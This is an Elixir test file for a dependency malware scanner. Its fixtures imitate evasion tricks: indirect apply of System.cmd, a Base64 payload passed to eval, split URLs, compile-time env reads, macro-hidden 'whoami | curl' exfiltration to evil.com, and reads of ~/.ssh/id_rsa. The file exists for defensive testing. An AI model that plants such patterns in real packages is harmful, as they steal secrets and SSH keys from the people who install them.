defmodule VetCore.Blackhat.EvasionTechniquesTest do
  @moduledoc """
  Black hat tests for evasion techniques an attacker might use to bypass detection.
  Each test creates code using a specific evasion strategy and verifies the scanner
  still catches it.
  """
  use ExUnit.Case, async: true

  alias VetCore.Checks.{SystemExec, CodeEval, NetworkAccess, EnvAccess, Obfuscation, CompilerHooks, FileAccess}
  alias VetCore.Types.Dependency

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp setup_dep(dep_name, source_files) do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_blackhat_#{System.unique_integer([:positive])}")
    dep_dir = Path.join([tmp_dir, "deps", to_string(dep_name)])
    lib_dir = Path.join(dep_dir, "lib")
    File.mkdir_p!(lib_dir)

    for {filename, content} <- source_files do
      path =
        if filename == "mix.exs" do
          Path.join(dep_dir, filename)
        else
          File.mkdir_p!(Path.dirname(Path.join(lib_dir, filename)))
          Path.join(lib_dir, filename)
        end

      File.write!(path, content)
    end

    unless Enum.any?(source_files, fn {f, _} -> f == "mix.exs" end) do
      mix_content = """
      defmodule #{Macro.camelize(to_string(dep_name))}.MixProject do
        use Mix.Project
        def project, do: [app: :#{dep_name}, version: "1.0.0"]
      end
      """

      File.write!(Path.join(dep_dir, "mix.exs"), mix_content)
    end

    lock = ~s(%{\n  "#{dep_name}": {:hex, :#{dep_name}, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock)

    {tmp_dir, %Dependency{name: dep_name, version: "1.0.0", source: :hex}}
  end

  defp cleanup(tmp_dir) do
    File.rm_rf!(tmp_dir)
  end

  # ---------------------------------------------------------------------------
  # Test: Indirect module reference via variable (dynamic apply/3)
  # ---------------------------------------------------------------------------

  describe "indirect module reference via variable" do
    setup do
      source = ~S"""
      defmodule Evasion.IndirectCall do
        def steal do
          mod = System
          func = :cmd
          apply(mod, func, ["curl", ["https://evil.com"]])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_indirect, [{"indirect.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects dynamic apply/3", %{project_path: path, dep: dep} do
      findings = Obfuscation.run(dep, path, [])

      apply_findings =
        Enum.filter(findings, fn f ->
          f.check_id == :obfuscation_dynamic_apply
        end)

      assert length(apply_findings) >= 1
      assert Enum.any?(apply_findings, &String.contains?(&1.description, "apply"))
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Encoded payload (Base64 decode + Code.eval_string in same scope)
  # ---------------------------------------------------------------------------

  describe "encoded payload (Base64 + eval)" do
    setup do
      source = ~S"""
      defmodule Evasion.Encoded do
        def execute do
          {:ok, payload} = Base.decode64("U3lzdGVtLmNtZCgiY3VybCIsIFsiaHR0cHM6Ly9ldmlsLmNvbSJdKQ==")
          Code.eval_string(payload)
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_encoded, [{"encoded.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects obfuscation decode_eval pattern", %{project_path: path, dep: dep} do
      findings = Obfuscation.run(dep, path, [])

      decode_eval_findings =
        Enum.filter(findings, &(&1.check_id == :obfuscation_decode_eval))

      assert length(decode_eval_findings) >= 1
      assert Enum.any?(decode_eval_findings, &(&1.severity == :critical))
    end

    test "detects code_eval for Code.eval_string", %{project_path: path, dep: dep} do
      findings = CodeEval.run(dep, path, [])
      assert length(findings) >= 1
      assert Enum.any?(findings, &(&1.check_id == :code_eval))
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Steganographic URL hiding (concatenated URL fragments)
  # ---------------------------------------------------------------------------

  describe "steganographic URL hiding" do
    setup do
      source = ~S"""
      defmodule Evasion.HiddenURL do
        @base "https://evil"
        @tld ".ngrok.io"
        @path "/steal"

        def exfil(data) do
          url = @base <> @tld <> @path
          :httpc.request(:post, {String.to_charlist(url), [], ~c"text/plain", data}, [], [])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_hidden_url, [{"hidden_url.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects network_access for :httpc.request even with hidden URL",
         %{project_path: path, dep: dep} do
      findings = NetworkAccess.run(dep, path, [])
      assert length(findings) >= 1

      httpc_finding = Enum.find(findings, &(&1.check_id == :network_access))
      assert httpc_finding != nil
      assert String.contains?(httpc_finding.description, "httpc")
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Compile-time conditional execution
  # ---------------------------------------------------------------------------

  describe "compile-time conditional execution" do
    setup do
      # The if block at module body level is still compile-time context.
      # We use a plain if (not Mix.env since Mix may not be available in test),
      # but the scanner still sees the AST nodes in module body context.
      source = ~S"""
      defmodule Evasion.Conditional do
        if true do
          @secret System.get_env("DATABASE_URL")
          :httpc.request(:get, {~c"https://evil.com/log?db=test", []}, [], [])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_conditional, [{"conditional.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects env_access at compile time inside conditional", %{project_path: path, dep: dep} do
      findings = EnvAccess.run(dep, path, [])
      assert length(findings) >= 1

      env_finding = Enum.find(findings, &(&1.check_id == :env_access))
      assert env_finding != nil
      assert env_finding.compile_time? == true
      assert env_finding.severity == :critical
    end

    test "detects network_access at compile time inside conditional",
         %{project_path: path, dep: dep} do
      findings = NetworkAccess.run(dep, path, [])
      assert length(findings) >= 1

      net_finding = Enum.find(findings, &(&1.check_id == :network_access))
      assert net_finding != nil
      assert net_finding.compile_time? == true
      assert net_finding.severity == :critical
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Macro-injected payload
  # ---------------------------------------------------------------------------

  describe "macro-injected payload" do
    setup do
      source = ~S"""
      defmodule Evasion.MacroPayload do
        defmacro safe_looking_helper(name) do
          quote do
            def unquote(name)() do
              System.cmd("sh", ["-c", "whoami | curl -X POST -d @- https://evil.com/collect"])
            end
          end
        end

        safe_looking_helper(:init)
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_macro, [{"macro_payload.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects system_exec inside quoted block in macro", %{project_path: path, dep: dep} do
      findings = SystemExec.run(dep, path, [])
      assert length(findings) >= 1

      # The AST walker traverses into the quote block and finds System.cmd
      cmd_finding = Enum.find(findings, &(&1.check_id == :system_exec))
      assert cmd_finding != nil
    end
  end

  # ---------------------------------------------------------------------------
  # Test: @external_resource for data exfiltration trigger
  # ---------------------------------------------------------------------------

  describe "@external_resource with sensitive file read" do
    setup do
      source = ~S"""
      defmodule Evasion.ExternalResource do
        @external_resource Path.expand("~/.ssh/id_rsa")
        @key File.read!(Path.expand("~/.ssh/id_rsa"))
      end
      """

      {tmp_dir, dep} = setup_dep(:evasion_extresource, [{"ext_resource.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects @external_resource compiler hook", %{project_path: path, dep: dep} do
      findings = CompilerHooks.run(dep, path, [])
      assert length(findings) >= 1

      ext_res =
        Enum.find(findings, fn f ->
          f.check_id == :compiler_hooks and String.contains?(f.description, "@external_resource")
        end)

      assert ext_res != nil
    end

    test "detects file_access with sensitive path", %{project_path: path, dep: dep} do
      findings = FileAccess.run(dep, path, [])
      assert length(findings) >= 1

      file_finding = Enum.find(findings, &(&1.check_id == :file_access))
      assert file_finding != nil
      # File.read! with ~/.ssh path should be :critical (sensitive path)
      assert file_finding.severity == :critical
    end
  end
end
